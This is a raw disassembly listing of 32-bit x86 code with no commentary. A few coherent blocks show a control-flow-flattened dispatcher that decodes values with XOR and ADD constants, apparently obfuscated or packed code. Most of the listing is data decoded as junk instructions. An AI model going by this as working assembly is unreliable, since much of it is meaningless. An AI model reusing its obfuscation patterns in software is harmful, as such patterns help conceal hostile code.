  40ec75:	mov    DWORD PTR ds:0x433833,0x73ce
  40ec7f:	mov    DWORD PTR [ebp-0x18],eax
  40ec82:	mov    DWORD PTR ds:0x43383f,0x7077
  40ec8c:	jmp    0x40f1ad
  40ec91:	cmp    edi,0x33d
  40ec97:	jne    0x40f120
  40ec9d:	and    DWORD PTR [ebp+0x8],0x0
  40eca1:	mov    eax,DWORD PTR [ebp-0x8]
  40eca4:	sub    eax,DWORD PTR [ebp+0x8]
  40eca7:	push   eax
  40eca8:	mov    eax,DWORD PTR [ebp-0x4]
  40ecab:	add    eax,DWORD PTR [ebp+0x8]
  40ecae:	push   eax
  40ecaf:	jmp    0x40eedc
  40ecb4:	es addr16 mov esi,0x2465bf5c
  40ecbb:	gs mov dh,0x91
  40ecbe:	test   BYTE PTR [ecx+esi*4-0x2cd2e9],bl
  40ecc5:	mov    eax,ds:0x7c0e7e7e
  40ecca:	jle    0x40ed4a
  40eccc:	inc    esi
  40eccd:	test   eax,0xa73b732f
  40ecd2:	inc    edi
  40ecd3:	bnd ret 0x1ad
  40ecd7:	ds jmp 0xfa20:0xf5e0e0ed
  40ecdf:	sbb    edx,DWORD PTR ds:0x5c395439
  40ece5:	mov    al,0x68
  40ece7:	div    al
  40ece9:	and    ch,BYTE PTR [ebp-0x33]
  40ecec:	in     al,0xc8
  40ecee:	sub    ebp,ecx
  40ecf0:	xchg   esp,eax
  40ecf1:	jge    0x40ed1b
  40ecf3:	je     0x40ed28
  40ecf5:	xor    BYTE PTR [ebx],al
  40ecf7:	in     al,0x30
  40ecf9:	jle    0x40ecd1
  40ecfb:	mov    bh,0x78
  40ecfd:	add    DWORD PTR [esi],esp
  40ecff:	shl    DWORD PTR ds:0xd2748308,cl
  40ed05:	out    dx,al
  40ed06:	or     eax,0xc9531034
  40ed0b:	in     eax,dx
  40ed0c:	and    DWORD PTR [edi+0x2e],ebp
  40ed0f:	sub    BYTE PTR [eax],bh
  40ed11:	and    esi,DWORD PTR [ebx+0x67349b46]
  40ed17:	inc    edx
  40ed18:	pop    ss
  40ed19:	cmc    
  40ed1a:	stc    
  40ed1b:	inc    edi
  40ed1c:	(bad)  
  40ed1d:	(bad)  
  40ed1e:	into   
  40ed1f:	loop   0x40eda0
  40ed21:	add    cl,BYTE PTR [ecx+0x37520aea]
  40ed27:	jl     0x40ed63
  40ed29:	cdq    
  40ed2a:	cmp    DWORD PTR [edi],edx
  40ed2c:	je     0x40eda0
  40ed2e:	in     al,0x2f
  40ed30:	clc    
  40ed31:	fisttp DWORD PTR [esi]
  40ed33:	sbb    esi,DWORD PTR [ebx+0x179f6b36]
  40ed39:	mov    ah,0x42
  40ed3b:	mov    ebp,0x1e1f9c00
  40ed40:	rol    dl,1
  40ed42:	pop    ds
  40ed43:	test   DWORD PTR ds:0xf42c65dc,0x1fcf0a82
  40ed4d:	jbe    0x40ecda
  40ed4f:	xor    DWORD PTR [ebp+0x24c27f8a],0xe763b9d6
  40ed59:	aad    0x4e
  40ed5b:	mov    ah,BYTE PTR [edx-0x47db1db3]
  40ed61:	xor    cl,BYTE PTR [ebx-0x76053454]
  40ed67:	dec    ebx
  40ed68:	mov    ds:0xce577ff3,eax
  40ed6d:	pop    ebp
  40ed6e:	iret   
  40ed6f:	jmp    0x40ed8a
  40ed71:	imul   eax,DWORD PTR [esi+ebx*1],0xd
  40ed75:	into   
  40ed76:	xchg   ecx,eax
  40ed77:	pop    esi
  40ed78:	or     DWORD PTR [esi],edi
  40ed7a:	imul   edi,DWORD PTR [eax+0x3a],0xffffff99
  40ed7e:	outs   dx,BYTE PTR ds:[esi]
  40ed7f:	js     0x40ed72
  40ed81:	outs   dx,BYTE PTR ds:[esi]
  40ed82:	inc    ebx
  40ed83:	(bad)  
  40ed85:	or     BYTE PTR [edx+ebx*4-0x15],0x3
  40ed8a:	hlt    
  40ed8b:	inc    ebx
  40ed8c:	pop    esp
  40ed8d:	aam    0x97
  40ed8f:	and    al,0xe4
  40ed91:	test   edx,esi
  40ed93:	ja     0x40ed98
  40ed95:	inc    ebp
  40ed96:	in     eax,dx
  40ed97:	std    
  40ed98:	add    al,0xc9
  40ed9a:	push   esi
  40ed9b:	lea    ecx,[ebx-0x4fe4bdd9]
  40eda1:	stc    
  40eda2:	jno    0x40ed5f
  40eda4:	push   ecx
  40eda5:	mov    ebx,0x7e6c5c79
  40edaa:	retf   0x92b5
  40edad:	pop    edx
  40edae:	aas    
  40edaf:	push   0x35
  40edb1:	pop    ss
  40edb2:	xor    dl,BYTE PTR [esi]
  40edb4:	dec    eax
  40edb5:	aad    0x90
  40edb7:	(bad)  
  40edb9:	pop    es
  40edba:	sar    DWORD PTR [ebp+0x3b],0xda
  40edbe:	cli    
  40edbf:	ins    BYTE PTR es:[edi],dx
  40edc0:	pop    edi
  40edc1:	jl     0x40edcb
  40edc3:	lods   al,BYTE PTR ds:[esi]
  40edc4:	mov    eax,0x9a23eefa
  40edc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edca:	jnp    0x40ed5f
  40edcc:	dec    edi
  40edcd:	aam    0x63
  40edcf:	push   ss
  40edd0:	or     eax,0xc5d71f83
  40edd5:	jg     0x40ed8e
  40edd7:	adc    eax,0xe159147f
  40eddc:	fsub   DWORD PTR [ecx+ecx*8-0x79ccac1b]
  40ede3:	inc    esi
  40ede4:	sub    al,0xfa
  40ede6:	fimul  DWORD PTR [edx-0x7d]
  40ede9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edea:	in     eax,0xeb
  40edec:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40edee:	test   BYTE PTR [ecx+0xf],bh
  40edf1:	pop    es
  40edf2:	xor    eax,0x4f61223d
  40edf7:	daa    
  40edf8:	cmp    DWORD PTR [esi+0x72cb673f],ebp
  40edfe:	jo     0x40ee44
  40ee00:	(bad)  
  40ee01:	call   0xe690150f
  40ee06:	jno    0x40ee04
  40ee08:	rcl    dl,0x9e
  40ee0b:	cld    
  40ee0c:	or     DWORD PTR [ecx-0x21],eax
  40ee0f:	leave  
  40ee10:	mov    al,0xca
  40ee12:	xchg   ebx,eax
  40ee13:	cs inc edi
  40ee15:	inc    edx
  40ee16:	stos   DWORD PTR es:[edi],eax
  40ee17:	or     ch,dl
  40ee19:	inc    ecx
  40ee1a:	or     cl,BYTE PTR [ebx]
  40ee1c:	dec    edx
  40ee1d:	push   ebp
  40ee1e:	je     0x40ee23
  40ee20:	stos   DWORD PTR es:[edi],eax
  40ee21:	fs cs xchg edi,eax
  40ee24:	sub    dh,BYTE PTR [edi-0x55103b43]
  40ee2a:	mov    ecx,0x2a859f1c
  40ee2f:	loope  0x40eea8
  40ee31:	icebp  
  40ee32:	stc    
  40ee33:	test   ecx,ebp
  40ee35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee36:	dec    edx
  40ee37:	mov    DWORD PTR [esi+ebx*4+0x26],edi
  40ee3b:	push   edi
  40ee3c:	loop   0x40edd8
  40ee3e:	mov    dh,0xaf
  40ee40:	ds (bad) 
  40ee42:	jb     0x40ee59
  40ee44:	loope  0x40ee4d
  40ee46:	int    0xc5
  40ee48:	cdq    
  40ee49:	loopne 0x40ee3e
  40ee4b:	cli    
  40ee4c:	pop    esp
  40ee4d:	test   BYTE PTR [esi-0x43],dl
  40ee50:	pop    esp
  40ee51:	(bad)  
  40ee52:	dec    eax
  40ee53:	jbe    0x40eec1
  40ee55:	fbstp  TBYTE PTR [edx-0x56]
  40ee58:	shl    cl,1
  40ee5a:	mov    bh,0xdd
  40ee5c:	loop   0x40ee59
  40ee5e:	mov    ebx,eax
  40ee60:	xchg   ebx,eax
  40ee61:	push   0xb3f1643f
  40ee66:	lods   al,BYTE PTR ds:[esi]
  40ee67:	push   0xf90fd3aa
  40ee6c:	jo     0x40ee74
  40ee6e:	out    dx,al
  40ee6f:	aad    0x62
  40ee71:	push   0x7c
  40ee73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee74:	inc    eax
  40ee75:	xchg   ecx,eax
  40ee76:	clc    
  40ee77:	scas   eax,DWORD PTR es:[edi]
  40ee78:	call   DWORD PTR [ecx]
  40ee7a:	xor    BYTE PTR [edx+0x63],bh
  40ee7d:	retf   
  40ee7e:	pop    ebx
  40ee7f:	outs   dx,BYTE PTR ds:[esi]
  40ee80:	dec    ecx
  40ee81:	int    0xf9
  40ee83:	out    dx,al
  40ee84:	add    ch,bl
  40ee86:	jo     0x40ee65
  40ee88:	ja     0x40ee75
  40ee8a:	add    dl,BYTE PTR [edx]
  40ee8c:	sbb    edx,DWORD PTR [edi+ebp*4-0x54]
  40ee90:	imul   edi,DWORD PTR [edx],0x71
  40ee93:	leave  
  40ee94:	cmp    ecx,DWORD PTR [ebp+ecx*1-0x48]
  40ee98:	arpl   WORD PTR [edx-0x74],si
  40ee9b:	repz xor eax,0x39d1f86c
  40eea1:	pop    esi
  40eea2:	jbe    0x40ee5a
  40eea4:	push   ss
  40eea5:	mov    esp,0x83c82032
  40eeaa:	js     0x40ee7d
  40eeac:	test   BYTE PTR [edx-0x24],ch
  40eeaf:	inc    ebx
  40eeb0:	add    DWORD PTR [esi-0x1f],ecx
  40eeb3:	(bad)  
  40eeb4:	fld    DWORD PTR [ebx+0x51]
  40eeb7:	into   
  40eeb8:	fstp   DWORD PTR [ecx+0x58a17c45]
  40eebe:	retf   
  40eebf:	js     0x40ef37
  40eec1:	icebp  
  40eec2:	mov    ebx,0x239a8f75
  40eec7:	cdq    
  40eec8:	pusha  
  40eec9:	call   0x25ca:0x97c0af28
  40eed0:	lea    ecx,ds:0x5c3a58cf
  40eed6:	test   ch,bh
  40eed8:	jne    0x40eebe
  40eeda:	imul   eax,DWORD PTR [ebx-0xa46218],0x845ffff
  40eee4:	cmp    DWORD PTR [ebp+0x8],0x52
  40eee8:	jb     0x40eca1
  40eeee:	jmp    0x40f1ad
  40eef3:	jmp    0x40f120
  40eef8:	lds    ebp,FWORD PTR [edx+0x1371069f]
  40eefe:	imul   ecx,DWORD PTR gs:[ebx+0x7e98ef46],0x8f302767
  40ef09:	scas   eax,DWORD PTR es:[edi]
  40ef0a:	jle    0x40ef8a
  40ef0c:	push   cs
  40ef0d:	jl     0x40ef8d
  40ef0f:	jle    0x40ef5d
  40ef11:	mov    edx,0x3ca257f5
  40ef16:	and    BYTE PTR [ecx-0x50b2af7d],0x48
  40ef1d:	(bad)  
  40ef1e:	jecxz  0x40eec0
  40ef20:	mov    edi,0xfffc857
  40ef25:	xchg   esi,eax
  40ef26:	jbe    0x40ef83
  40ef28:	in     al,dx
  40ef29:	dec    esi
  40ef2a:	mov    edx,0x9f0d289b
  40ef2f:	(bad)  [eax+ecx*1-0x75f28f6c]
  40ef36:	and    dh,BYTE PTR [ebx-0x6cbfd20]
  40ef3c:	sbb    DWORD PTR ds:0x5dbab896,eax
  40ef42:	inc    ebp
  40ef43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef44:	int3   
  40ef45:	xor    dh,BYTE PTR ds:0xea994f1b
  40ef4b:	das    
  40ef4c:	fnstcw WORD PTR [edx]
  40ef4e:	inc    ebp
  40ef4f:	inc    ecx
  40ef50:	jg     0x40ef31
  40ef52:	inc    ebx
  40ef53:	push   esi
  40ef54:	jmp    0x1ad0:0x10aff622
  40ef5b:	fucomip st,st(2)
  40ef5d:	call   0xad4a7d14
  40ef62:	out    dx,al
  40ef63:	sti    
  40ef64:	cli    
  40ef65:	push   0x3683f7ec
  40ef6a:	int    0x6c
  40ef6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef6d:	xor    al,0xe
  40ef6f:	mov    ebp,0x77d99a17
  40ef74:	ins    DWORD PTR es:[edi],dx
  40ef75:	xor    al,0x6b
  40ef77:	test   ebx,esp
  40ef79:	pop    esp
  40ef7a:	test   ch,ch
  40ef7c:	xor    al,0x60
  40ef7e:	fdivr  QWORD PTR [ebp+0x5f]
  40ef81:	mov    edx,0xfa22cd04
  40ef86:	jecxz  0x40ef90
  40ef88:	mov    al,0x67
  40ef8a:	fdecstp 
  40ef8c:	cmp    dl,BYTE PTR ds:[esi]
  40ef8f:	out    dx,al
  40ef90:	ror    BYTE PTR [ecx+0x6c610972],1
  40ef96:	dec    edi
  40ef97:	jae    0x40efea
  40ef99:	or     DWORD PTR [esi],0x331145e4
  40ef9f:	jo     0x40ef79
  40efa1:	inc    esp
  40efa2:	rcl    BYTE PTR [esi],1
  40efa4:	pop    eax
  40efa5:	loopne 0x40ef8b
  40efa7:	aas    
  40efa8:	out    dx,al
  40efa9:	in     al,0xc8
  40efab:	scas   al,BYTE PTR es:[edi]
  40efac:	mov    ah,0x2f
  40efae:	out    dx,al
  40efaf:	xchg   ebp,eax
  40efb0:	lods   al,BYTE PTR ds:[esi]
  40efb1:	arpl   WORD PTR [edx+edi*4],sp
  40efb4:	pusha  
  40efb5:	fld    DWORD PTR [edx-0x79]
  40efb8:	jns    0x40ef5c
  40efba:	outs   dx,DWORD PTR ds:[esi]
  40efbb:	lds    ebp,FWORD PTR [esi]
  40efbd:	push   eax
  40efbe:	mov    edi,0x9d19cf4c
  40efc3:	shl    DWORD PTR [esi-0x269ff07f],1
  40efc9:	pop    esp
  40efca:	and    eax,0xb46ea7d8
  40efcf:	add    al,0x4f
  40efd1:	xor    edx,DWORD PTR [eax+0x1622d7a3]
  40efd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efd8:	pop    edi
  40efd9:	inc    ecx
  40efda:	or     BYTE PTR [ebx-0x51],dl
  40efdd:	int3   
  40efde:	cli    
  40efdf:	sub    al,0xda
  40efe1:	cmp    ebp,DWORD PTR [eax+0x4f2ace]
  40efe7:	mov    ebp,0xbc20258d
  40efec:	fidiv  DWORD PTR [ecx]
  40efee:	sub    eax,0xc7f8284
  40eff3:	pop    dx
  40eff5:	sbb    ebp,DWORD PTR [ebp-0x3e4505bc]
  40effb:	push   ebx
  40effc:	adc    eax,0xf7821633
  40f001:	(bad)  
  40f003:	jecxz  0x40ef86
  40f005:	js     0x40efd5
  40f007:	xsha256 (bad)
  40f008:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f009:	push   esi
  40f00a:	push   esp
  40f00b:	adc    bl,BYTE PTR ds:0xa0654c70
  40f011:	ds inc ebx
  40f013:	les    ebx,FWORD PTR [eax]
  40f015:	xchg   edx,eax
  40f016:	test   BYTE PTR [edx+0x1064ac1],ah
  40f01c:	add    BYTE PTR [edi],ch
  40f01e:	add    ebp,DWORD PTR [edx+0x45]
  40f021:	and    ebp,DWORD PTR [eax]
  40f023:	xchg   BYTE PTR [eax+0x4c481602],dh
  40f029:	pop    esi
  40f02a:	or     dl,BYTE PTR [edx-0x75]
  40f02d:	iret   
  40f02e:	add    bl,BYTE PTR [ebx+eiz*8-0x7fe04255]
  40f035:	pop    es
  40f036:	push   esi
  40f037:	adc    al,0xa9
  40f039:	outs   dx,BYTE PTR ds:[esi]
  40f03a:	(bad)  
  40f03b:	xor    BYTE PTR [ebx-0x38f05005],bh
  40f041:	inc    ecx
  40f042:	xchg   esi,eax
  40f043:	loopne 0x40f0a6
  40f045:	and    eax,0xef28a388
  40f04a:	adc    al,0x36
  40f04c:	mov    edx,0x412b6471
  40f051:	fiadd  DWORD PTR [esi]
  40f053:	dec    ebx
  40f054:	repz pop es
  40f056:	mov    ecx,edx
  40f058:	push   0x14b354c6
  40f05d:	test   BYTE PTR [eax-0x10da9230],0xef
  40f064:	rol    al,cl
  40f066:	stc    
  40f067:	cld    
  40f068:	sub    al,0xe6
  40f06a:	push   es
  40f06b:	xchg   esi,eax
  40f06c:	mov    eax,ds:0x9a33dd82
  40f071:	jmp    0x87dc:0x8bd8d9c2
  40f078:	jno    0x40f06f
  40f07a:	mov    ds,WORD PTR [ebx-0x2b]
  40f07d:	addr16 daa 
  40f07f:	stc    
  40f080:	pop    ebx
  40f081:	add    edi,DWORD PTR [edx-0x71]
  40f084:	repz push edi
  40f086:	sub    DWORD PTR [edx+0x15bcf175],ecx
  40f08c:	call   0xae3171d4
  40f091:	inc    eax
  40f092:	nop
  40f093:	or     edx,0xffffffdf
  40f096:	xchg   esp,eax
  40f097:	or     bh,dh
  40f099:	inc    ebp
  40f09a:	loopne 0x40f04f
  40f09c:	icebp  
  40f09d:	jns    0x40f0ea
  40f09f:	mov    dh,0x9c
  40f0a1:	mov    bl,0xbe
  40f0a3:	(bad)  
  40f0a4:	popa   
  40f0a5:	sbb    ebp,DWORD PTR [esi+ebp*8+0x1a4961a2]
  40f0ac:	(bad)
  40f0af:	stos   DWORD PTR es:[edi],eax
  40f0b0:	push   ecx
  40f0b1:	loope  0x40f0de
  40f0b3:	mov    ch,0x24
  40f0b5:	retf   0xc17b
  40f0b8:	sbb    bh,BYTE PTR [ebx]
  40f0ba:	push   0x54
  40f0bc:	outs   dx,BYTE PTR ds:[esi]
  40f0bd:	xchg   DWORD PTR [esi+edx*2-0x67],ecx
  40f0c1:	sbb    edx,DWORD PTR [edi+0x1d]
  40f0c4:	rol    BYTE PTR ds:0x4ddbd76a,0xbb
  40f0cb:	in     al,0xa6
  40f0cd:	idiv   BYTE PTR [edi+0x7b]
  40f0d0:	push   ebp
  40f0d1:	mov    bh,0x4d
  40f0d3:	mov    ss,WORD PTR [ebp-0x2671f21b]
  40f0d9:	mov    WORD PTR [eax+0x5b],ds
  40f0dc:	ficomp WORD PTR [eax+0x5b7c12f8]
  40f0e2:	push   ebp
  40f0e3:	push   ds
  40f0e4:	dec    edx
  40f0e5:	or     eax,0xf46b4031
  40f0ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0eb:	push   ecx
  40f0ec:	mov    WORD PTR [edi-0x66c60021],es
  40f0f2:	ja     0x40f0c1
  40f0f4:	icebp  
  40f0f5:	push   0xffffffd5
  40f0f7:	mov    esi,0x911cf248
  40f0fc:	test   al,0xf1
  40f0fe:	inc    eax
  40f0ff:	fbstp  TBYTE PTR [eax+0x48]
  40f102:	jecxz  0x40f0cd
  40f104:	push   esp
  40f105:	neg    BYTE PTR [eax]
  40f107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f108:	jno    0x40f0a1
  40f10a:	imul   eax,DWORD PTR [edx-0x1fe39bf5],0x6e
  40f111:	jecxz  0x40f18f
  40f113:	xor    esp,DWORD PTR [esi-0x4d0f73e3]
  40f119:	and    esi,edi
  40f11b:	sub    DWORD PTR [esi],esi
  40f11d:	jg     0x40f0f9
  40f11f:	jnp    0x40f0a2
  40f121:	jmp    DWORD PTR [ebx+0xf000001]
  40f127:	test   DWORD PTR [edi+0x0],ecx
  40f12a:	add    BYTE PTR [eax],al
  40f12c:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40f133:	mov    eax,DWORD PTR [ebp-0x4]
  40f136:	mov    DWORD PTR [ebp-0x5c],eax
  40f139:	mov    eax,DWORD PTR [ebp-0x8]
  40f13c:	mov    DWORD PTR [ebp-0x58],eax
  40f13f:	mov    eax,DWORD PTR [ebp-0xc]
  40f142:	xor    eax,esi
  40f144:	add    eax,ebx
  40f146:	mov    DWORD PTR [ebp-0x54],eax
  40f149:	lea    eax,[ebp-0x1c]
  40f14c:	mov    DWORD PTR [ebp-0x50],eax
  40f14f:	mov    eax,DWORD PTR [ebp-0x60]
  40f152:	xor    eax,esi
  40f154:	add    eax,ebx
  40f156:	mov    DWORD PTR [ebp-0x60],eax
  40f159:	lea    eax,[ebp-0x60]
  40f15c:	push   eax
  40f15d:	mov    eax,DWORD PTR [ebp+0xc]
  40f160:	xor    eax,esi
  40f162:	add    eax,ebx
  40f164:	push   eax
  40f165:	mov    eax,ds:0x413bfe
  40f16a:	push   0x413b54
  40f16f:	push   DWORD PTR [eax]
  40f171:	call   0x40c099
  40f176:	jmp    0x40f1ad
  40f17b:	cmp    edi,0x13d
  40f181:	jne    0x40f1ad
  40f187:	mov    eax,DWORD PTR [ebp-0x10]
  40f18a:	xor    eax,esi
  40f18c:	add    eax,ebx
  40f18e:	mov    DWORD PTR [ebp+0x8],eax
  40f191:	mov    eax,ds:0x413bde
  40f196:	mov    DWORD PTR [ebp+0x8],eax
  40f199:	mov    eax,DWORD PTR [ebp-0x14]
  40f19c:	mov    DWORD PTR [ebp-0x4],eax
  40f19f:	mov    eax,DWORD PTR [ebp-0x4]
  40f1a2:	push   0x4
  40f1a4:	pop    ecx
  40f1a5:	sub    ecx,eax
  40f1a7:	add    ecx,DWORD PTR [ebp-0x18]
  40f1aa:	mov    DWORD PTR [ebp-0x8],ecx
  40f1ad:	mov    eax,DWORD PTR [ebp+0xc]
  40f1b0:	xor    eax,esi
  40f1b2:	lea    edi,[edi+eax*1+0x32729b]
  40f1b9:	cmp    edi,0x50b
  40f1bf:	jne    0x40ea09
  40f1c5:	mov    eax,DWORD PTR [ebp+0xc]
  40f1c8:	pop    edi
  40f1c9:	xor    eax,esi
  40f1cb:	jmp    0x40f3f8
  40f1d0:	push   edx
  40f1d1:	mov    ecx,0x7215e615
  40f1d6:	jno    0x40f241
  40f1d8:	scas   al,BYTE PTR es:[edi]
  40f1d9:	out    dx,al
  40f1da:	lds    esp,FWORD PTR [edx+0x36462f75]
  40f1e0:	lahf   
  40f1e1:	lods   eax,DWORD PTR ds:[esi]
  40f1e2:	jle    0x40f262
  40f1e4:	push   cs
  40f1e5:	jl     0x40f265
  40f1e7:	jle    0x40f1e6
  40f1e9:	stc    
  40f1ea:	mov    ch,0x53
  40f1ec:	xor    eax,0xc9638e3f
  40f1f1:	je     0x40f1d1
  40f1f3:	push   0x33
  40f1f5:	cmp    al,0xe5
  40f1f7:	sub    BYTE PTR [ecx],bl
  40f1f9:	push   ds
  40f1fa:	loopne 0x40f1c0
  40f1fc:	or     ah,BYTE PTR [edx]
  40f1fe:	mov    bl,BYTE PTR [ecx-0x29]
  40f201:	call   0x27f:0xaf92586e
  40f208:	jns    0x40f268
  40f20a:	rcr    ch,cl
  40f20c:	rol    BYTE PTR [eax+0x6b],1
  40f20f:	(bad)  
  40f210:	js     0x40f234
  40f212:	stc    
  40f213:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f214:	sub    DWORD PTR [esi+ebx*4-0x22],ebx
  40f218:	mov    bl,dl
  40f21a:	pop    edi
  40f21b:	inc    ebx
  40f21c:	push   edx
  40f21d:	outs   dx,DWORD PTR ds:[esi]
  40f21e:	xchg   DWORD PTR ds:0x9684577,esi
  40f224:	cli    
  40f225:	repnz dec esi
  40f227:	mov    dh,0x39
  40f229:	and    dh,BYTE PTR [edx+eax*8-0x7e]
  40f22d:	dec    BYTE PTR [esi]
  40f22f:	cmp    eax,0x7e1b931c
  40f234:	nop
  40f235:	or     eax,0x71d21c3d
  40f23a:	and    edi,0xffffffc1
  40f23d:	jo     0x40f25a
  40f23f:	sub    esi,DWORD PTR [edi+0x36b1af0f]
  40f245:	icebp  
  40f246:	repz and DWORD PTR [edx+esi*8],eax
  40f24a:	add    BYTE PTR [eax+0x1da27a6],dh
  40f250:	pop    esi
  40f251:	mov    al,ds:0x9163e433
  40f256:	fadd   QWORD PTR [ebp-0x51947015]
  40f25c:	xor    DWORD PTR [esi+0x59df15b0],edx
  40f262:	sahf   
  40f263:	jno    0x40f21c
  40f265:	lock sti 
  40f267:	test   BYTE PTR ds:0x2779843b,0x49
  40f26e:	jle    0x40f229
  40f270:	adc    eax,0xffacdc76
  40f275:	fist   DWORD PTR [esp+esi*8-0x7a8b046c]
  40f27c:	sbb    al,0xdc
  40f27e:	test   al,bl
  40f280:	add    al,0xec
  40f282:	push   edi
  40f283:	stos   BYTE PTR es:[edi],al
  40f284:	lods   eax,DWORD PTR ds:[esi]
  40f285:	ss dec ebx
  40f287:	into   
  40f288:	xor    DWORD PTR [ebp+0x41c03f1e],ebx
  40f28e:	xor    BYTE PTR [ebx+0x6c],dh
  40f291:	jb     0x40f2ab
  40f293:	sbb    DWORD PTR [ecx],ebp
  40f295:	sar    BYTE PTR [ebx-0x2414a957],1
  40f29b:	inc    esp
  40f29c:	cdq    
  40f29d:	fiadd  DWORD PTR [ebx+esi*4+0x200c2056]
  40f2a4:	inc    eax
  40f2a5:	dec    ebx
  40f2a6:	test   eax,0x34c0b18
  40f2ab:	out    dx,eax
  40f2ac:	or     eax,0x946116f7
  40f2b1:	gs mov esp,0x939ce481
  40f2b7:	into   
  40f2b8:	mov    ebp,0xfe576443
  40f2bd:	call   0xb027:0x5e2e4667
  40f2c4:	lds    ebx,FWORD PTR [esi+0x508688cc]
  40f2ca:	adc    BYTE PTR [edi-0x3],ah
  40f2cd:	fsubr  QWORD PTR [ebp-0x5]
  40f2d0:	stos   BYTE PTR es:[edi],al
  40f2d1:	xchg   ebx,eax
  40f2d2:	xor    al,0xda
  40f2d4:	push   edi
  40f2d5:	clc    
  40f2d6:	call   0x76b6:0x3a47d6f2
  40f2dd:	call   0xd16b:0x1f79328c
  40f2e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2e5:	out    dx,eax
  40f2e6:	pop    ss
  40f2e7:	adc    DWORD PTR gs:[edx+edx*8],esi
  40f2eb:	cmp    eax,0xfaeee245
  40f2f0:	xor    ecx,eax
  40f2f2:	add    al,0x74
  40f2f4:	mov    ecx,0x581630b9
  40f2f9:	dec    esi
  40f2fa:	add    al,BYTE PTR [esi+0xcb9c037]
  40f300:	les    ecx,FWORD PTR [eax+ebp*1+0x3c0303e7]
  40f307:	sbb    ecx,ebp
  40f309:	pop    ds
  40f30a:	xchg   edx,eax
  40f30b:	or     al,BYTE PTR [ebp-0x3d7e117e]
  40f311:	enter  0x8f5f,0x2b
  40f315:	mov    cl,0x1
  40f317:	jge    0x40f385
  40f319:	test   DWORD PTR [ecx+0x1529333e],esp
  40f31f:	mov    ch,0x45
  40f321:	(bad)  
  40f322:	mov    ds:0x7c242aae,al
  40f327:	ret    0x454a
  40f32a:	sbb    BYTE PTR [ecx-0x6c350a0a],ah
  40f330:	push   ebp
  40f331:	shl    BYTE PTR [ecx+0x74],1
  40f334:	pop    esi
  40f335:	add    DWORD PTR [ecx],edi
  40f337:	addr16 (bad) 
  40f339:	lods   eax,DWORD PTR ds:[esi]
  40f33a:	sbb    BYTE PTR [edi+0x2],al
  40f33d:	jo     0x40f2cd
  40f33f:	stos   DWORD PTR es:[edi],eax
  40f340:	dec    esp
  40f341:	xchg   BYTE PTR [ebp-0x2d14673],dl
  40f347:	dec    edi
  40f348:	jge    0x40f3b0
  40f34a:	mov    eax,ds:0x11d3c1dc
  40f34f:	sbb    ah,BYTE PTR [edx+0x3c]
  40f352:	dec    edx
  40f353:	rol    DWORD PTR ds:0xc22a8360,cl
  40f359:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f35a:	xor    WORD PTR [ebx-0x1],si
  40f35e:	cmp    ebp,DWORD PTR [eax]
  40f360:	fstp   TBYTE PTR [eax-0x780ae6a7]
  40f366:	outs   dx,BYTE PTR ds:[esi]
  40f367:	jo     0x40f3e7
  40f369:	enter  0xb3f2,0x58
  40f36d:	jecxz  0x40f370
  40f36f:	in     eax,dx
  40f370:	or     eax,edx
  40f372:	outs   dx,DWORD PTR ds:[esi]
  40f373:	daa    
  40f374:	push   esi
  40f375:	pop    edx
  40f376:	ret    0xdda8
  40f379:	fld    TBYTE PTR [ebp-0x16ac8c1b]
  40f37f:	pop    ecx
  40f380:	sbb    DWORD PTR [esi+0x6d868585],esi
  40f386:	sbb    eax,0xef7f0ffe
  40f38b:	mov    DWORD PTR [ebp-0x11313012],ebp
  40f391:	sub    ebx,DWORD PTR [edx+eax*1+0x1f4dda8f]
  40f398:	xchg   al,cl
  40f39a:	inc    BYTE PTR [esi+0x730d30b6]
  40f3a0:	addr16 mov ecx,0xb34a7a78
  40f3a6:	std    
  40f3a7:	repz (bad) 
  40f3a9:	cld    
  40f3aa:	dec    ebp
  40f3ab:	loopne 0x40f3f7
  40f3ad:	and    eax,0xa40f6e85
  40f3b2:	adc    eax,esp
  40f3b4:	xor    DWORD PTR [esi],0xffffffd8
  40f3b7:	fwait
  40f3b8:	adc    esp,DWORD PTR [ebx]
  40f3ba:	jne    0x40f412
  40f3bc:	lock inc esi
  40f3be:	pop    es
  40f3bf:	push   esp
  40f3c0:	jbe    0x40f419
  40f3c2:	jl     0x40f3ec
  40f3c4:	jl     0x40f3c4
  40f3c6:	daa    
  40f3c7:	sub    eax,0xb1da9de4
  40f3cc:	add    BYTE PTR [ecx+0x76],al
  40f3cf:	fs xchg edi,eax
  40f3d1:	mov    eax,ds:0x737ec71d
  40f3d6:	xchg   edi,eax
  40f3d7:	dec    ecx
  40f3d8:	popa   
  40f3d9:	hlt    
  40f3da:	int    0xfc
  40f3dc:	xor    al,0xa9
  40f3de:	out    0xca,eax
  40f3e0:	pop    esi
  40f3e1:	inc    eax
  40f3e2:	call   0xef5d5231
  40f3e7:	aad    0x1b
  40f3e9:	adc    esi,DWORD PTR [edx-0x301afc53]
  40f3ef:	test   dx,0x47d4
  40f3f4:	or     eax,0x5efd7524
  40f3f9:	add    eax,ebx
  40f3fb:	pop    ebx
  40f3fc:	leave  
  40f3fd:	ret    0x8
  40f400:	push   ebp
  40f401:	mov    ebp,esp
  40f403:	push   ecx
  40f404:	mov    DWORD PTR ds:0x433827,0x6a14
  40f40e:	push   ecx
  40f40f:	xor    ecx,edx
  40f411:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40f418:	jmp    0x40f6e7
  40f41d:	call   0xa1f0:0x6df6cd0b
  40f424:	push   ebx
  40f425:	inc    ebx
  40f426:	push   edi
  40f427:	dec    ecx
